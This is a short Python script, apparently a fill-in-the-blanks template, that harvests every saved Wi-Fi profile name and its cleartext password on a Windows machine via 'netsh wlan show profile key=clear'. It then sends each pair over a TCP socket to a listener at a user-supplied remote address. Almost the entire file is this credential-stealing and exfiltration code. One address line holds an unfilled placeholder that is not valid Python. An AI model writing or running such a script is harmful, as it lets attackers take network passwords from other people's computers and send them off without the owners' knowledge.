import subprocess
import os
import re
import socket

pub = "your public ip"
desk = "your local ip"
pi = "This was the ip of my raspberry pi but you could use it for any device!"

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

wifi_list = []

if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = {}
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", "name=", f"{name}"], capture_output = True).stdout.decode()

        if re.search("Security key           : Absent", profile_info):
            wifi_profile["ssid"] = name
            wifi_profile["password"] = "none"
            wifi_list.append(wifi_profile)
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", "name=", f"{name}", "key=clear"], capture_output = True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = "none"
            else:
                wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile) 

printlist = []
for pasw in wifi_list:
    printlist.append(pasw["ssid"] + "   |   " + pasw["password"])

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ADDR = (pub/desk/pi/other var, "your port")
client.connect(ADDR)

def send(msg):
    message = msg.encode("utf-8")
    msg_bits = len(message)
    send_bits = str(msg_bits).encode("utf-8")
    send_bits += b" " * (256 - len(send_bits))
    print(msg_bits)
    client.send(send_bits)
    client.send(message)
    if msg != "disc":
        print("message sent")

#prints all the items you got from the wifi paswd scrape
for i in printlist:
    send(i)

#This is nice to include at the end of every script, since it disconnects you off the server, wich will prevent it from crashing.
send("disc")
print("disconnect sent")